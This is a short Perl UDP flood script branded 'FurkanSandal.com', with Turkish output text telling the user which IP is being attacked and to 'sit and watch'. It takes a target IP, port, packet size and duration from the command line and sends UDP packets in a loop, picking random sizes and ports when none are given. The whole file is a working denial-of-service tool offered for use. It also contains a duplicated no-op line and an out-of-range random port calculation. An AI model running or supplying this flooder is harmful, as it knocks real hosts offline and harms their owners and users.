#!/usr/bin/perl

##
# FurkanSandal.com UDP FLOOD
##

use Socket;
use strict;

my ($ip,$port,$boyut,$saniye) = @ARGV;

my ($iaddr,$bitissure,$pboyut,$pport);

$iaddr = inet_aton("$ip") or die "Host adi cozumlenemiyor. $ip\n";
$bitissure = time() + ($saniye ? $saniye : 99999999);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "FurkanSandal.COM\n";
print "UDP Flooder Script\n\n\n";

 print           "              Saldırdıgın IP : $ip
			Saldiriliyor su porta " .
        ($port ? $port : "Secim olmadigi icin otomatik secildi") ." ".($saniye ? "$saniye saniye boyunca devam edecek" : "
Otur ve izle :trl  ") . "\n";
        ($port ? $port : "Secim olmadigi icin otomatik secildi") ." ".($saniye ? "$saniye  saniye boyunca devam edecek" : "
Otur ve izle :trl  ") . "\n";
        print "Durdurmak için Ctrl-C\n" unless $saniye;

for (;time() <= $bitissure;) {
  $pboyut = $boyut ? $boyut : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(6550000))+1;

  send(flood, pack("a$pboyut","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
